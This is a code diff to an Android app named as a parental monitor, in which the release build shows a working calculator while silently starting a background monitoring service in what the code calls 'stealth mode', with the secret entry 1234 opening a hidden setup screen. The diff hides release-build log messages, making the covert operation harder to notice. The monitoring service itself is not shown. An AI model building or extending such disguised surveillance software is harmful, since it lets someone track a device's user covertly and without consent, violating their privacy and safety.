@@ -40,17 +40,17 @@ class MainActivity : AppCompatActivity() {
     ) { permissions ->
         val allGranted = permissions.values.all { it }
         if (allGranted) {
-            android.util.Log.i("MainActivity", "✅ All permissions granted!")
+            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "All permissions granted")
             Toast.makeText(this, getString(R.string.msg_permissions_granted), Toast.LENGTH_SHORT).show()
             
             // RELEASE mode: Auto-start service after permissions granted
             if (!BuildConfig.DEBUG && preferencesManager.isConfigured()) {
-                android.util.Log.i("MainActivity", "🚀 Starting monitoring service after permissions...")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "🚀 Starting monitoring service after permissions...")
                 if (!preferencesManager.isMonitoringEnabled) {
                     try {
                         startMonitoringService()
                         preferencesManager.isMonitoringEnabled = true
-                        android.util.Log.i("MainActivity", "✓ Service started successfully!")
+                        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "✓ Service started successfully!")
                         Toast.makeText(this, getString(R.string.msg_monitoring_started), Toast.LENGTH_SHORT).show()
                     } catch (e: Exception) {
                         android.util.Log.e("MainActivity", "✗ Failed to start service: ${e.message}")
@@ -67,20 +67,20 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        android.util.Log.i("MainActivity", "═══ MainActivity onCreate ═══")
-        android.util.Log.i("MainActivity", "BuildConfig.DEBUG = ${BuildConfig.DEBUG}")
+        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "MainActivity onCreate")
+        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "DEBUG mode")
         
         preferencesManager = PreferencesManager.getInstance(this)
 
         if (!BuildConfig.DEBUG) {
-            android.util.Log.i("MainActivity", "Entering RELEASE mode - CALCULATOR UI")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Entering RELEASE mode - CALCULATOR UI")
             setContentView(R.layout.activity_calculator)
             initCalculator()
             startMonitoringInBackground()
             return
         }
 
-        android.util.Log.i("MainActivity", "Entering DEBUG mode - CALCULATOR UI")
+        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Entering DEBUG mode - CALCULATOR UI")
         setContentView(R.layout.activity_calculator)
         initCalculator()
     }
@@ -98,21 +98,15 @@ class MainActivity : AppCompatActivity() {
     private var justCalculated = false
     
     private fun initCalculator() {
-        android.util.Log.i("MainActivity", "Initializing Calculator UI")
+        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Initializing Calculator UI")
         calculatorDisplay = findViewById(R.id.calculatorDisplay)
         calculatorHistory = findViewById(R.id.calculatorHistory)
         
         // Number buttons
-        findViewById<android.widget.Button>(R.id.btn0).setOnClickListener { appendNumber("0") }
-        findViewById<android.widget.Button>(R.id.btn1).setOnClickListener { appendNumber("1") }
-        findViewById<android.widget.Button>(R.id.btn2).setOnClickListener { appendNumber("2") }
-        findViewById<android.widget.Button>(R.id.btn3).setOnClickListener { appendNumber("3") }
-        findViewById<android.widget.Button>(R.id.btn4).setOnClickListener { appendNumber("4") }
-        findViewById<android.widget.Button>(R.id.btn5).setOnClickListener { appendNumber("5") }
-        findViewById<android.widget.Button>(R.id.btn6).setOnClickListener { appendNumber("6") }
-        findViewById<android.widget.Button>(R.id.btn7).setOnClickListener { appendNumber("7") }
-        findViewById<android.widget.Button>(R.id.btn8).setOnClickListener { appendNumber("8") }
-        findViewById<android.widget.Button>(R.id.btn9).setOnClickListener { appendNumber("9") }
+        val digitViews = listOf(R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9)
+        digitViews.forEachIndexed { index, viewId ->
+            findViewById<android.widget.Button>(viewId).setOnClickListener { appendNumber(index.toString()) }
+        }
         findViewById<android.widget.Button>(R.id.btnDot).setOnClickListener { appendNumber(".") }
         
         // Operator buttons
@@ -125,7 +119,7 @@ class MainActivity : AppCompatActivity() {
         findViewById<android.widget.Button>(R.id.btnEquals).setOnClickListener { calculate() }
         findViewById<android.widget.Button>(R.id.btnClear).setOnClickListener { clear() }
         
-        android.util.Log.i("MainActivity", "✓ Calculator initialized")
+        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Calculator initialized")
     }
     
     private fun appendNumber(number: String) {
@@ -171,7 +165,7 @@ class MainActivity : AppCompatActivity() {
     
     private fun calculate() {
         if (currentNumber == "1234" && previousNumber.isEmpty() && operator.isEmpty() && !justCalculated) {
-            android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
             currentNumber = ""
             previousNumber = ""
             operator = ""
@@ -207,7 +201,7 @@ class MainActivity : AppCompatActivity() {
     
     private fun formatResult(result: Double): String {
         if (result.isNaN() || result.isInfinite()) return "Error"
-        if (result % 1.0 == 0.0 && result >= Long.MIN_VALUE.toDouble() && result <= Long.MAX_VALUE.toDouble()) {
+        if (result == kotlin.math.floor(result) && kotlin.math.abs(result) < 9e15) {
             return result.toLong().toString()
         }
         return String.format(java.util.Locale.US, "%.8f", result).trimEnd('0').trimEnd('.')
@@ -245,7 +239,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startMonitoringInBackground() {
-        android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
+        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
         
         // Check if already configured and has permissions
         if (!preferencesManager.isConfigured()) {
@@ -262,19 +256,19 @@ class MainActivity : AppCompatActivity() {
         
         // Start monitoring service silently
         if (preferencesManager.userDisabledMonitoring) {
-            android.util.Log.i("MainActivity", "Monitoring disabled by user - not auto-starting")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring disabled by user - not auto-starting")
             return
         }
         if (!preferencesManager.isMonitoringEnabled) {
             try {
                 startMonitoringService()
                 preferencesManager.isMonitoringEnabled = true
-                android.util.Log.i("MainActivity", "✓ Monitoring started in background!")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "✓ Monitoring started in background!")
             } catch (e: Exception) {
                 android.util.Log.e("MainActivity", "✗ Failed to start monitoring: ${e.message}")
             }
         } else {
-            android.util.Log.i("MainActivity", "Monitoring already running")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring already running")
         }
     }
     
@@ -293,19 +287,19 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startMonitoringService() {
-        android.util.Log.d("MainActivity", "Creating service intent...")
+        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Creating service intent...")
         val intent = Intent(this, MonitoringService::class.java).apply {
             action = MonitoringService.ACTION_START_MONITORING
         }
 
-        android.util.Log.d("MainActivity", "Starting service...")
+        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Starting service...")
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(intent)
-                android.util.Log.i("MainActivity", "Started as foreground service")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Started as foreground service")
             } else {
                 startService(intent)
-                android.util.Log.i("MainActivity", "Started as regular service")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Started as regular service")
             }
         } catch (e: Exception) {
             android.util.Log.e("MainActivity", "Failed to start service", e)
